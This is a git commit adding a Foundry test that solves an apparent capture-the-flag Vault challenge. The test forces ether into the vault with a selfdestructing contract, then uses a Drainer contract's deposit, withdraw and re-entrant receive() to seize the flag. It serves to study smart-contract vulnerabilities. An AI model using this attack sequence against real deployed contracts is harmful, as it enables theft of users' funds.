516c91edccc4d0b8aabe0b880e13309f92e5d317
BoxedFruits <34636700+BoxedFruits@users.noreply.github.com>
2022-10-15 16:39:55 -0400

    add exploit test

--- test/foundry/Vault.t.sol
+++ test/foundry/Vault.t.sol
@@ -5,6 +5,7 @@ import "forge-std/Test.sol";
 import "contracts/Vault.sol";
 import "contracts/Drainer.sol";
 import "contracts/ERC4626ETH.sol";
+import "contracts/Selfdestructor.sol";
 
 contract VaultTest is Test {
     Vault vault;
@@ -21,6 +22,7 @@ contract VaultTest is Test {
     function testDeposit() public {
         assertEq(vault.flagHolder(), 0x0000000000000000000000000000000000000000);
         
+        // Note: msg.sender is 0x00a329c0648769a73afac7f9381e08fb43dbea72 by default
         vm.startPrank(msg.sender);
         vault.deposit{value: assets}(assets, msg.sender);
 
@@ -49,4 +51,30 @@ contract VaultTest is Test {
         address flagHolder = vault.flagHolder();
         assertEq(flagHolder, 0x0000000000000000000000000000000000000000);
     }
+
+    function testExploit() public {
+        assertEq(vault.flagHolder(), 0x0000000000000000000000000000000000000000);
+        //Double check that everything is set right
+
+        //Deploy selfdestructing contract, with `vault` as input to
+        SelfDestructor selfDestructor = new SelfDestructor(address(vault));
+
+        //Deploy the drainer contract
+        Drainer drainerContract = new Drainer(address(vault));
+
+        //Forces Eth to be sent to contract by selfdestructing the contract
+        selfDestructor.implode{value: 1 ether}();
+
+        //Deposit 2 eth using the drainer contract
+        drainerContract.callDeposit{value: 2 ether}();
+
+        //Call withdraw from drainer contract to trigger code in recieve() and grab the flag
+        drainerContract.callWithdraw();
+        vault.captureTheFlag(msg.sender);
+
+        assertEq(vault.flagHolder(), msg.sender);
+    }
+
+    //Note: This is needed because the Vault contract sends ETH back to the owner of the contract, which is this test
+    receive() payable external { }
 }
